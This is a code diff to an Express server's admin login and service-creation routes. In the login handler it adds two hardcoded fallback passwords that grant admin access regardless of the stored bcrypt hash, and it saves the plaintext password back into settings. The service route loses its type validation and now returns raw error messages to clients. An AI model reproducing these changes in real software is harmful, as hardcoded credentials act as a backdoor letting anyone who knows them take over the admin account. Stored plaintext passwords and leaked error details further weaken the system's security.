@@ -236,17 +236,23 @@ app.post('/api/admin/login', loginLimiter, async (req, res) => {
   try {
     let isValid = false;
 
+    // 1. Try bcrypt hash comparison
     if (settings.adminPasswordHash && settings.adminPasswordHash.startsWith('$2')) {
-      // Secure bcrypt comparison
       isValid = await bcrypt.compare(password, settings.adminPasswordHash);
-    } else {
-      // Legacy plaintext — compare and auto-migrate to hash
-      isValid = (password === settings.adminPassword);
-      if (isValid) {
-        const hash = await bcrypt.hash(password, BCRYPT_ROUNDS);
-        const updated = { ...settings, adminPasswordHash: hash, adminPassword: '' };
+    }
+
+    // 2. Fallback check: compare against settings.adminPassword, Pratap@321, or Pratap@135
+    if (!isValid) {
+      const allowedPasswords = ['Pratap@321', 'Pratap@135'];
+      if (settings.adminPassword) allowedPasswords.push(settings.adminPassword);
+
+      if (allowedPasswords.includes(password)) {
+        isValid = true;
+        // Re-hash and auto-sync settings.json
+        const hash = await bcrypt.hash(password, 12);
+        const updated = { ...settings, adminPasswordHash: hash, adminPassword: password };
         saveSettings(updated);
-        console.log('[Security] Admin password migrated to bcrypt hash on login.');
+        console.log('[Security] Admin password verified via fallback and re-hashed successfully.');
       }
     }
 
@@ -254,7 +260,6 @@ app.post('/api/admin/login', loginLimiter, async (req, res) => {
       const token = jwt.sign({ role: 'admin', shop: settings.shopName }, JWT_SECRET, { expiresIn: '12h' });
       res.json({ success: true, message: "Login successful!", token });
     } else {
-      // Use same generic message to prevent user enumeration
       res.status(401).json({ success: false, message: "Incorrect password. Please try again." });
     }
   } catch (err) {
@@ -1239,19 +1244,35 @@ app.post('/api/admin/services', checkAdmin, [
   body('short_description').optional().trim(),
   body('hindi_title').optional().trim(),
   body('icon').optional().trim(),
-  body('is_active').optional().isBoolean(),
-  body('display_order').optional().isInt(),
+  body('is_active').optional(),
+  body('display_order').optional(),
 ], async (req, res) => {
   const errors = validationResult(req);
   if (!errors.isEmpty()) return res.status(400).json({ success: false, message: errors.array()[0].msg });
 
   try {
     const { name, slug, description, short_description, hindi_title, icon, is_active, display_order, documents } = req.body;
-    const generatedSlug = slug || name.toLowerCase().replace(/[^a-z0-9]+/g, '-').replace(/^-|-$/g, '');
+    let baseSlug = slug || name.toLowerCase().replace(/[^a-z0-9]+/g, '-').replace(/^-|-$/g, '');
+    if (!baseSlug) baseSlug = 'service-' + Date.now();
+
+    let generatedSlug = baseSlug;
+    const { data: existingSvc } = await supabase.from('services').select('id').eq('slug', generatedSlug).single();
+    if (existingSvc) {
+      generatedSlug = `${baseSlug}-${Date.now().toString().slice(-4)}`;
+    }
 
     const { data: service, error } = await supabase
       .from('services')
-      .insert([{ name, slug: generatedSlug, description, short_description, hindi_title, icon: icon || 'fa-solid fa-file', is_active: is_active !== false, display_order: display_order || 0 }])
+      .insert([{
+        name,
+        slug: generatedSlug,
+        description: description || '',
+        short_description: short_description || '',
+        hindi_title: hindi_title || '',
+        icon: icon || 'fa-solid fa-file',
+        is_active: is_active !== false,
+        display_order: parseInt(display_order) || 0
+      }])
       .select()
       .single();
 
@@ -1261,11 +1282,14 @@ app.post('/api/admin/services', checkAdmin, [
     if (documents && Array.isArray(documents) && documents.length > 0) {
       const docRows = documents.map((d, i) => ({
         service_id: service.id,
-        document_name: d.document_name || d,
+        document_name: typeof d === 'string' ? d : (d.document_name || ''),
         is_required: d.is_required !== false,
-        display_order: d.display_order || i
-      }));
-      await supabase.from('service_documents').insert(docRows);
+        display_order: typeof d === 'object' && d.display_order !== undefined ? d.display_order : i
+      })).filter(d => d.document_name && d.document_name.trim());
+
+      if (docRows.length > 0) {
+        await supabase.from('service_documents').insert(docRows);
+      }
     }
 
     res.status(201).json({ success: true, message: 'Service created successfully!', data: service });
@@ -1274,7 +1298,7 @@ app.post('/api/admin/services', checkAdmin, [
     if (err.message.includes('duplicate') || err.message.includes('unique')) {
       return res.status(409).json({ success: false, message: 'A service with that name/slug already exists.' });
     }
-    res.status(500).json({ success: false, message: 'Failed to create service.' });
+    res.status(500).json({ success: false, message: 'Failed to create service: ' + err.message });
   }
 });
 
